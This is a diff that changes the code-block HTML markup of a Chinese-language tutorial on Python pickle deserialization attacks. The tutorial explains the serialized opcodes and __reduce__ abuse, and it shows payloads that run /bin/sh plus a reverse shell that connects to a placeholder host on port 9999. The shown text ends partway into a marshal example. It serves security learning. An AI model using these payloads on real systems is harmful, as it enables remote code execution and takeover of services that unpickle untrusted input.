@@ -18,71 +18,23 @@
 <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>本篇文章搬运大佬k0rz3n的研究文章，写的特别好，存下来学习一下。</p>
 <h2 id="0X01-Python-的序列化和反序列化是什么"><a href="#0X01-Python-的序列化和反序列化是什么" class="headerlink" title="0X01 Python 的序列化和反序列化是什么"></a><strong>0X01 Python 的序列化和反序列化是什么</strong></h2><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p>
 <h3 id="1-用代码展示序列化和反序列化的过程："><a href="#1-用代码展示序列化和反序列化的过程：" class="headerlink" title="1.用代码展示序列化和反序列化的过程："></a><strong>1.用代码展示序列化和反序列化的过程：</strong></h3><p>为了看起来直观一些，我写了一个示例代码：</p>
-<h4 id="序列化示例代码："><a href="#序列化示例代码：" class="headerlink" title="序列化示例代码："></a><strong>序列化示例代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">class</span> <span class="token class-name">People</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"uf9n1x"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+<h4 id="序列化示例代码："><a href="#序列化示例代码：" class="headerlink" title="序列化示例代码："></a><strong>序列化示例代码：</strong></h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">"uf9n1x"</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"Hello ! My friends"</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span> c</span><br></pre></td></tr></tbody></table></figure>
 
-    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span> <span class="token string">"Hello ! My friends"</span>
+<h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a><strong>结果：</strong></h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">people</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">S<span class="string">'name'</span></span><br><span class="line">p6</span><br><span class="line">S<span class="string">'uf9n1x'</span></span><br><span class="line">p7</span><br><span class="line">sb.</span><br></pre></td></tr></tbody></table></figure>
 
-a<span class="token operator">=</span>People<span class="token punctuation">(</span><span class="token punctuation">)</span>
-c<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-<span class="token keyword">print</span> c
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a><strong>结果：</strong></h4><pre class="line-numbers language-python"><code class="language-python">ccopy_reg
-_reconstructor
-p0
-<span class="token punctuation">(</span>c__main__
-people
-p1
-c__builtin__
-object
-p2
-Ntp3
-Rp4
-<span class="token punctuation">(</span>dp5
-S<span class="token string">'name'</span>
-p6
-S<span class="token string">'uf9n1x'</span>
-p7
-sb<span class="token punctuation">.</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>先不要管这些乱七八糟的符号是什么(这是 PVM 虚拟机可以识别的有特殊含义的符号，我在后面会说)，我们先看一下我们认识的，可以清楚地看到 我们对象的属性 name K0rz3n 我们对象所属的类 people 都已近存储在里面了，如果了解过 PHP 反序列化漏洞，你一定知道这和 PHP 的序列化的内容大同小异，因为 PHP 也是将类名和对象的属性序列化进去的。</p>
-<h4 id="反序列化示例代码："><a href="#反序列化示例代码：" class="headerlink" title="反序列化示例代码："></a><strong>反序列化示例代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">class</span> <span class="token class-name">People</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"uf9n1x"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+<h4 id="反序列化示例代码："><a href="#反序列化示例代码：" class="headerlink" title="反序列化示例代码："></a><strong>反序列化示例代码：</strong></h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">"uf9n1x"</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"Hello ! My friends"</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">d = pickle.loads(c)</span><br><span class="line">d.say()</span><br></pre></td></tr></tbody></table></figure>
 
-    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span> <span class="token string">"Hello ! My friends"</span>
-
-a<span class="token operator">=</span>People<span class="token punctuation">(</span><span class="token punctuation">)</span>
-c<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-d <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
-d<span class="token punctuation">.</span>say<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a><strong>结果：</strong></h4><p>Hello ! My friends </p>
 <p>可以看到，我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法</p>
 <p><strong>注意：</strong></p>
 <p>如果我在反序列化以前删除了 People<br>这个类，那么我们在反序列化的过程中因为对象在当前的运行环境中没有找到这个类就会报错，从而反序列化失败。</p>
 <p><strong>示例代码：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">class</span> <span class="token class-name">People</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">"uf9n1x"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name = <span class="string">"uf9n1x"</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"Hello ! My friends"</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">del</span> People</span><br><span class="line">d = pickle.loads(c)</span><br></pre></td></tr></tbody></table></figure>
 
-    <span class="token keyword">def</span> <span class="token function">say</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span> <span class="token string">"Hello ! My friends"</span>
-
-a<span class="token operator">=</span>People<span class="token punctuation">(</span><span class="token punctuation">)</span>
-c<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-<span class="token keyword">del</span> People
-d <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>结果：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python">AttributeError<span class="token punctuation">:</span> <span class="token string">'module'</span> object has no attribute <span class="token string">'People'</span> 
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: <span class="string">'module'</span> <span class="built_in">object</span> has no attribute <span class="string">'People'</span> </span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="2-用语言来描述序列化和反序列化的过程："><a href="#2-用语言来描述序列化和反序列化的过程：" class="headerlink" title="2.用语言来描述序列化和反序列化的过程："></a><strong>2.用语言来描述序列化和反序列化的过程：</strong></h3><h4 id="1-序列化过程："><a href="#1-序列化过程：" class="headerlink" title="1.序列化过程："></a><strong>1.序列化过程：</strong></h4><p>(1)从对象提取所有属性,并将属性转化为名值对<br>(2)写入对象的类名<br>(3)写入名值对</p>
 <h4 id="2-反序列化过程："><a href="#2-反序列化过程：" class="headerlink" title="2.反序列化过程："></a><strong>2.反序列化过程：</strong></h4><p>(1)获取 pickle 输入流<br>(2)重建属性列表<br>(3)根据类名创建一个新的对象<br>(4)将属性复制到新的对象中</p>
 <p><strong>注意：</strong></p>
@@ -136,21 +88,11 @@ d <span class="token operator">=</span> pickle<span class="token punctuation">.<
 <p>在 python2 中有两种声明类的方式，并且他们实例化的对象性质是不同的</p>
 <p><strong>示例代码：</strong></p>
 <p><strong>旧式类：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-<span class="token operator">&lt;</span>type <span class="token string">'instance'</span><span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = A()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(a)</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">'instance'</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>新式类：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span>
-<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
-<span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> B<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
-<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'__main__.B'</span><span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = B()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(b)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'__main__.B'</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
+
 <p>但是 Python3 中解决了这个问题，在表现上消除了两者的差别，所以如果在 python2 中我们使用 <strong>reduce</strong> 要使用下面这种声明类的方法</p>
 <p>好了，回到正题，我们先看一下官方是怎么介绍这个 <strong>reduce</strong> 的，</p>
 <p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型(<strong>这里指的就是新式类</strong>)的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化</p>
@@ -158,53 +100,26 @@ d <span class="token operator">=</span> pickle<span class="token punctuation">.<
 <p>当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 <strong>reduce</strong> 方法的返回值的底层实现 ）</p>
 <p>这时候耳边传来：<strong>“程序员还是要用代码说话，你说什么人话呢！？”</strong>，好，那我赶紧用代码证明一下我上面啰嗦的废话吧。</p>
 <h4 id="2-实践开始"><a href="#2-实践开始" class="headerlink" title="2.实践开始"></a><strong>2.实践开始</strong></h4><p><strong>实例代码：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> os
-<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        a <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
-test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-<span class="token keyword">print</span> test
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a = <span class="string">'/bin/sh'</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span> test</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>结果：</strong></p>
 <p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161647954.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn反序列化</a> reduce1 .png)</p>
 <p>我们先不要管这里面的 p0 p1 p2 ,我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p 后面的数字是 key ，因此对最后命令的执行没有任何影响</p>
 <p>为了比较方便，我再把上面的那段代码拿下来</p>
-<pre class="line-numbers language-python"><code class="language-python">cos
-system
-<span class="token punctuation">(</span>S<span class="token string">'/bin/sh'</span>
-tR<span class="token punctuation">.</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'/bin/sh'</span></span><br><span class="line">tR.</span><br></pre></td></tr></tbody></table></figure>
+
 <p>是不是没有任何区别？没错，这再次证明了我的猜测： PVM 的 操作码 R 就是 <strong>reduce</strong> 的返回值的一个底层实现。</p>
 <p>我们让上面这个结果进行反序列化看一下结果</p>
 <p><strong>示例代码：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> os
-<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        a <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
-test <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>test<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a = <span class="string">'/bin/sh'</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>结果：</strong></p>
 <p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161647799.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn反序列化</a> reduce2 .png)</p>
 <p>那这样就非常的方便了，我们能利用这个 reduce 轻松构造我们想要执行的命令，甚至是执行代码（我们可以将 字符串部分换成 python -c “我们要执行的代码”）</p>
 <p><strong>我们尝试执行代码反弹 shell</strong></p>
 <p><strong>示例代码：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> os
-<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
-a<span class="token operator">=</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span>
-result <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
-pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))    </span><br><span class="line">a=A()</span><br><span class="line">result = pickle.dumps(a)</span><br><span class="line">pickle.loads(result)</span><br></pre></td></tr></tbody></table></figure>
+
 <p>我在我的 vps 上开 9999 端口进行监听</p>
 <p><strong>如图所示：</strong></p>
 <p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161647480.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn反序列化</a> reduce3 .png)</p>
@@ -219,39 +134,15 @@ pickle<span class="token punctuation">.</span>loads<span class="token punctuatio
 <p>咦？你上面不是说 pickle 不能序列化代码对象吗？ 没错，pickle 的确不可以，不信我们试一试</p>
 <p>由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()</p>
 <p><strong>示例代码：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'fib(10) ='</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">'/bin/sh'</span>)</span><br><span class="line">pickle.dumps(foo.func_code)</span><br></pre></td></tr></tbody></table></figure>
 
-<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">import</span> os
-    <span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> n <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> n
-        <span class="token keyword">return</span> fib<span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> fib<span class="token punctuation">(</span>n<span class="token number">-2</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span> <span class="token string">'fib(10) ='</span><span class="token punctuation">,</span> fib<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
-    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
-pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>foo<span class="token punctuation">.</span>func_code<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>结果:</strong></p>
 <p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161647154.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://picture-1253331270.cos.ap-beijing.myqcloud.com/python反序列化</a> 代码执行1.png)</p>
 <h4 id="4-问题解决"><a href="#4-问题解决" class="headerlink" title="4.问题解决"></a><strong>4.问题解决</strong></h4><p>但是，我们还有一个利器，自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块–Marshal</p>
 <p>我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行 base64 处理</p>
 <p><strong>示例代码：</strong></p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> marshal
-<span class="token keyword">import</span> base64
